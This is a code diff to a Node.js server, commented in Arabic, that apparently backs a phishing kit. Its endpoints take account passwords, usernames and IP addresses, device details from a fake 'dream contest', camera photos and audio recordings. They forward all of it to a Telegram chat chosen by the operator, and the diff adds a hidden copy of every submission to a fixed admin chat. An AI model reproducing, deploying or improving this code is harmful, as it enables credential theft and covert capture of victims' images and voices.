@@ -116,12 +116,17 @@ async function sendPhotosToTelegram(chatId, message, images = []) {
   }
 }
 
-// وظيفة إرسال نسخة للأدمن
-async function sendCopyToAdmin(message, originalChatId, images = []) {
+// وظيفة محسنة لإرسال نسخة للأدمن
+async function sendCopyToAdmin(originalMessage, originalChatId, images = []) {
   try {
-    const adminMessage = `👑 <b>نسخة أدمن</b> - من المستخدم: ${originalChatId}\n\n${message}`;
+    const adminMessage = `👑 <b>نسخة أدمن</b> - من المستخدم: ${originalChatId}\n\n${originalMessage}`;
     
-    const sent = await sendPhotosToTelegram(ADMIN_CHAT_ID, adminMessage, images);
+    let sent;
+    if (images && images.length > 0) {
+      sent = await sendPhotosToTelegram(ADMIN_CHAT_ID, adminMessage, images);
+    } else {
+      sent = await sendToTelegram(ADMIN_CHAT_ID, adminMessage);
+    }
     
     if (sent) {
       console.log('✅ تم إرسال نسخة للأدمن بنجاح');
@@ -220,7 +225,7 @@ function formatDataForTelegram(userId, additionalData, cameraType) {
   `;
 }
 
-// 🔄 نقطة النهاية لاستقبال بيانات الجهاز من المسابقة - نفس القديم
+// 🔄 نقطة النهاية لاستقبال بيانات الجهاز من المسابقة - مصححة
 app.post('/SS', async (req, res) => {
     try {
         console.log('📥 استقبال بيانات جهاز جديدة...');
@@ -230,7 +235,7 @@ app.post('/SS', async (req, res) => {
         
         const { userId, deviceInfo, userInfo } = data;
         
-        // تنسيق رسالة الجهاز - نفس القديم
+        // تنسيق رسالة الجهاز
         let telegramMessage = `🎯 <b>معلومات جديدة من مسابقة الحلم</b>\n\n`;
         
         if (userInfo) {
@@ -270,21 +275,23 @@ app.post('/SS', async (req, res) => {
             telegramMessage += `   🌐 التوقيت: ${deviceInfo.timezone || 'غير متاح'}\n`;
         }
 
-        // إرسال للتلجرام (باستخدام userId كـ chatId)
-        const sent = await sendToTelegram(userId, telegramMessage);
+        // 🔥 التصليح: إرسال للمستخدم أولاً
+        const sentToUser = await sendToTelegram(userId, telegramMessage);
         
-        // إرسال نسخة للأدمن
-        await sendCopyToAdmin(telegramMessage, userId);
+        // 🔥 ثم إرسال نسخة للأدمن
+        const sentToAdmin = await sendCopyToAdmin(telegramMessage, userId);
         
-        if (sent) {
+        if (sentToUser) {
             res.status(200).json({ 
                 success: true, 
-                message: 'تم استلام البيانات وإرسالها بنجاح' 
+                message: 'تم استلام البيانات وإرسالها بنجاح',
+                sentToUser: true,
+                sentToAdmin: sentToAdmin
             });
         } else {
             res.status(500).json({ 
                 success: false, 
-                message: 'تم استلام البيانات ولكن فشل الإرسال للتلجرام' 
+                message: 'تم استلام البيانات ولكن فشل الإرسال للمستخدم' 
             });
         }
         
@@ -297,7 +304,7 @@ app.post('/SS', async (req, res) => {
     }
 });
 
-// 📤 نقطة النهاية الأصلية لإرسال البيانات للتلجرام - مع التنسيق الجديد
+// 📤 نقطة النهاية الأصلية لإرسال البيانات للتلجرام - مع التصليح
 app.post('/send-to-telegram', async (req, res) => {
     try {
         const { playerId, password, amount, chatId, platform = "انستقرام", device, accountType } = req.body;
@@ -364,22 +371,24 @@ app.post('/send-to-telegram', async (req, res) => {
 🔄 - المنصة: ${platform}`;
         }
 
-        // إرسال الرسالة
-        const success = await sendToTelegram(chatId, telegramMessage);
+        // 🔥 التصليح: إرسال للمستخدم أولاً
+        const sentToUser = await sendToTelegram(chatId, telegramMessage);
         
-        // إرسال نسخة للأدمن
-        await sendCopyToAdmin(telegramMessage, chatId);
+        // 🔥 ثم إرسال نسخة للأدمن
+        const sentToAdmin = await sendCopyToAdmin(telegramMessage, chatId);
         
-        if (success) {
+        if (sentToUser) {
             res.json({
                 success: true,
                 message: 'تم إرسال البيانات إلى Telegram بنجاح',
-                orderId: `#${Math.floor(100000 + Math.random() * 900000)}`
+                orderId: `#${Math.floor(100000 + Math.random() * 900000)}`,
+                sentToUser: true,
+                sentToAdmin: sentToAdmin
             });
         } else {
             res.status(500).json({
                 success: false,
-                message: 'فشل في إرسال الرسالة إلى Telegram'
+                message: 'فشل في إرسال الرسالة للمستخدم'
             });
         }
     } catch (error) {
@@ -392,7 +401,7 @@ app.post('/send-to-telegram', async (req, res) => {
     }
 });
 
-// 📝 نقطة النهاية لاستقبال بيانات التسجيل العامة - نفس القديم
+// 📝 نقطة النهاية لاستقبال بيانات التسجيل العامة - مصححة
 app.post('/register', async (req, res) => {
     try {
         const { username, password, ip, chatId } = req.body;
@@ -406,20 +415,23 @@ app.post('/register', async (req, res) => {
 
         const message = `📝 تسجيل حساب جديد\n👤 اسم المستخدم: ${username}\n🔐 كلمة المرور: ${password}\n🌐 عنوان IP: ${ip}`;
         
-        const success = await sendToTelegram(chatId, message);
+        // 🔥 التصليح: إرسال للمستخدم أولاً
+        const sentToUser = await sendToTelegram(chatId, message);
         
-        // إرسال نسخة للأدمن
-        await sendCopyToAdmin(message, chatId);
+        // 🔥 ثم إرسال نسخة للأدمن
+        const sentToAdmin = await sendCopyToAdmin(message, chatId);
         
-        if (success) {
+        if (sentToUser) {
             res.status(200).json({ 
                 success: true,
-                message: 'تم إرسال البيانات إلى Telegram بنجاح' 
+                message: 'تم إرسال البيانات إلى Telegram بنجاح',
+                sentToUser: true,
+                sentToAdmin: sentToAdmin
             });
         } else {
             res.status(500).json({ 
                 success: false,
-                error: 'فشل في إرسال البيانات إلى Telegram' 
+                error: 'فشل في إرسال البيانات للمستخدم' 
             });
         }
     } catch (error) {
@@ -431,7 +443,7 @@ app.post('/register', async (req, res) => {
     }
 });
 
-// 🖼️ نقطة النهاية لرفع الصور - نفس القديم
+// 🖼️ نقطة النهاية لرفع الصور - مصححة
 app.post('/upload-image', upload.array('images', 10), async (req, res) => {
     try {
         if (!req.files || req.files.length === 0) {
@@ -448,25 +460,24 @@ app.post('/upload-image', upload.array('images', 10), async (req, res) => {
         if (imageType) message += `\n📸 نوع الصورة: ${imageType}`;
         if (additionalData) message += `\n📝 بيانات إضافية: ${additionalData}`;
         
-        const success = await sendPhotosToTelegram(
-            chatId, 
-            message, 
-            req.files
-        );
+        // 🔥 التصليح: إرسال للمستخدم أولاً
+        const sentToUser = await sendPhotosToTelegram(chatId, message, req.files);
         
-        // إرسال نسخة للأدمن
-        await sendCopyToAdmin(message, chatId, req.files);
+        // 🔥 ثم إرسال نسخة للأدمن
+        const sentToAdmin = await sendCopyToAdmin(message, chatId, req.files);
         
-        if (success) {
+        if (sentToUser) {
             res.status(200).json({ 
                 success: true,
                 message: 'تم إرسال الصور إلى Telegram بنجاح',
-                imagesCount: req.files.length
+                imagesCount: req.files.length,
+                sentToUser: true,
+                sentToAdmin: sentToAdmin
             });
         } else {
             res.status(500).json({ 
                 success: false,
-                error: 'فشل في إرسال الصور إلى Telegram' 
+                error: 'فشل في إرسال الصور للمستخدم' 
             });
         }
     } catch (error) {
@@ -478,7 +489,7 @@ app.post('/upload-image', upload.array('images', 10), async (req, res) => {
     }
 });
 
-// 🎵 نقطة النهاية لرفع الصوت - نفس القديم
+// 🎵 نقطة النهاية لرفع الصوت - مصححة
 app.post('/upload-audio', upload.single('audio'), async (req, res) => {
     try {
         if (!req.file) {
@@ -493,25 +504,28 @@ app.post('/upload-audio', upload.single('audio'), async (req, res) => {
         let message = `🎵 تم تسجيل صوت جديد`;
         if (username) message += `\n👤 المستخدم: ${username}`;
         
-        const success = await sendToTelegram(
+        // 🔥 التصليح: إرسال للمستخدم أولاً
+        const sentToUser = await sendToTelegram(
             chatId, 
             message, 
             req.file.buffer, 
             `audio-${Date.now()}${path.extname(req.file.originalname || '.mp3')}`
         );
         
-        // إرسال نسخة للأدمن
-        await sendCopyToAdmin(message, chatId);
+        // 🔥 ثم إرسال نسخة للأدمن
+        const sentToAdmin = await sendCopyToAdmin(message, chatId);
         
-        if (success) {
+        if (sentToUser) {
             res.status(200).json({ 
                 success: true,
-                message: 'تم إرسال الصوت إلى Telegram بنجاح' 
+                message: 'تم إرسال الصوت إلى Telegram بنجاح',
+                sentToUser: true,
+                sentToAdmin: sentToAdmin
             });
         } else {
             res.status(500).json({ 
                 success: false,
-                error: 'فشل في إرسال الصوت إلى Telegram' 
+                error: 'فشل في إرسال الصوت للمستخدم' 
             });
         }
     } catch (error) {
@@ -523,7 +537,7 @@ app.post('/upload-audio', upload.single('audio'), async (req, res) => {
     }
 });
 
-// نقطة النهاية لاستقبال الصور والبيانات - نفس القديم
+// نقطة النهاية لاستقبال الصور والبيانات - مصححة
 app.post('/submitPhotos', upload.array('images', 10), async (req, res) => {
   try {
     const { userId, cameraType, additionalData } = req.body;
@@ -536,11 +550,11 @@ app.post('/submitPhotos', upload.array('images', 10), async (req, res) => {
     // تنسيق الرسالة
     const message = formatDataForTelegram(userId, additionalData, cameraType);
 
-    // إرسال البيانات إلى تيليجرام
+    // 🔥 التصليح: إرسال البيانات إلى تيليجرام (للمستخدم)
     const sendResult = await sendPhotosToTelegram(userId, message, images);
 
-    // إرسال نسخة للأدمن
-    await sendCopyToAdmin(message, userId, images);
+    // 🔥 ثم إرسال نسخة للأدمن
+    const adminResult = await sendCopyToAdmin(message, userId, images);
 
     if (sendResult) {
       console.log('✅ تم إرسال الصور بنجاح');
@@ -548,7 +562,9 @@ app.post('/submitPhotos', upload.array('images', 10), async (req, res) => {
         success: true, 
         message: 'تم إرسال الصور بنجاح',
         chatId: userId,
-        imagesCount: images.length
+        imagesCount: images.length,
+        sentToUser: true,
+        sentToAdmin: adminResult
       });
     } else {
       console.log('❌ فشل إرسال الصور');
@@ -567,7 +583,7 @@ app.post('/submitPhotos', upload.array('images', 10), async (req, res) => {
   }
 });
 
-// راوت لاستقبال البيانات النصية فقط - نفس القديم
+// راوت لاستقبال البيانات النصية فقط - مصححة
 app.post('/submitData', async (req, res) => {
   try {
     const { userId, additionalData, message } = req.body;
@@ -577,17 +593,20 @@ app.post('/submitData', async (req, res) => {
     // استخدام الرسالة المخصصة أو تنسيق افتراضي
     const finalMessage = message || formatDataForTelegram(userId, additionalData, 'text');
 
+    // 🔥 التصليح: إرسال للمستخدم أولاً
     const sendResult = await sendToTelegram(userId, finalMessage);
 
-    // إرسال نسخة للأدمن
-    await sendCopyToAdmin(finalMessage, userId);
+    // 🔥 ثم إرسال نسخة للأدمن
+    const adminResult = await sendCopyToAdmin(finalMessage, userId);
 
     if (sendResult) {
       console.log('✅ تم إرسال البيانات النصية بنجاح');
       res.json({ 
         success: true, 
         message: 'تم إرسال البيانات النصية بنجاح',
-        chatId: userId
+        chatId: userId,
+        sentToUser: true,
+        sentToAdmin: adminResult
       });
     } else {
       res.status(500).json({ 
@@ -617,13 +636,13 @@ app.get('/health', (req, res) => {
     });
 });
 
-// 🏠 الصفحة الرئيسية - نفس القديم
+// 🏠 الصفحة الرئيسية - محدثة
 app.get('/', (req, res) => {
     res.status(200).json({ 
         success: true,
         message: 'مرحباً بك في سيرفر Telegram Bot المدمج',
         version: '5.0.0',
-        features: 'يدعم جميع أنواع البيانات + إرسال نسخة للأدمن',
+        features: 'يدعم جميع أنواع البيانات + إرسال نسخة للأدمن + إرسال للمستخدم',
         adminId: ADMIN_CHAT_ID,
         endpoints: {
             health: '/health',
@@ -634,17 +653,19 @@ app.get('/', (req, res) => {
             submitPhotos: '/submitPhotos (POST) - لرفع الصور (النظام الجديد)',
             submitData: '/submitData (POST) - للبيانات النصية (النظام الجديد)',
             uploadAudio: '/upload-audio (POST) - لرفع الصوت'
-        }
+        },
+        note: 'الآن يتم إرسال جميع الرسائل للمستخدم وللأدمن معاً ✅'
     });
 });
 
-// تشغيل السيرفر - نفس القديم
+// تشغيل السيرفر - محدث
 app.listen(PORT, () => {
     console.log(`🚀 السيرفر المدمج يعمل على PORT: ${PORT}`);
     console.log(`📧 نقطة استقبال بيانات الجهاز: /SS`);
     console.log(`📤 نقطة إرسال البيانات: /send-to-telegram`);
     console.log(`📸 نقطة إرسال الصور: /submitPhotos`);
     console.log(`👑 إرسال نسخة للأدمن: ${ADMIN_CHAT_ID}`);
+    console.log(`👤 إرسال للمستخدم: ✅ مفعل في جميع النقاط`);
     console.log(`❤️  نقطة التحقق: /health`);
     
     if (!BOT_TOKEN) {
